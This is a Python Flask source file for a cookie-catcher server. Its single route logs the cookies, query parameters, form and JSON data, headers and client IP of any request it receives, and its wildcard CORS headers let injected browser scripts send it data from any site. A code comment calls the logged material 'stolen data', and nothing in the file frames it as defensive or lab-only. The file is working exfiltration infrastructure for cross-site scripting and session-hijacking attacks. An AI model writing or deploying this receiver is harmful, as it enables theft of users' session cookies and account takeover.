from flask import Flask, request, jsonify
from datetime import datetime

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST', 'OPTIONS'])
def receive_cookie():
    """
    Receives and logs cookies and data sent via GET or POST.
    """
    # Extract data from different parts of the request
    cookies = request.cookies
    get_params = request.args.to_dict()
    
    # Handle JSON payload or standard form data
    if request.is_json:
        post_data = request.get_json(silent=True)
    else:
        post_data = request.form.to_dict()

    # Build a structured log entry
    log_entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "cookies": cookies,
        "get_params": get_params,
        "post_data": post_data,
        "headers": dict(request.headers),
        "remote_addr": request.remote_addr
    }

    # Print to Render's live logs so you can see the stolen data in real-time
    print("="*60)
    print(f"📩 DATA RECEIVED at {log_entry['timestamp']}")
    print(f"🍪 Cookies: {cookies}")
    print(f"📦 GET Params: {get_params}")
    print(f"📨 POST Data: {post_data}")
    print(f"🌐 IP: {request.remote_addr}")
    print("="*60)

    # Return a simple success response
    return jsonify({
        "status": "success",
        "message": "Cookie received successfully!",
        "received": log_entry
    }), 200

# Enable Cross-Origin Resource Sharing (CORS) for testing from browser consoles
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
    response.headers.add('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
    return response

if __name__ == '__main__':
    # Render requires the server to listen on 0.0.0.0
    app.run(host='0.0.0.0', port=5000)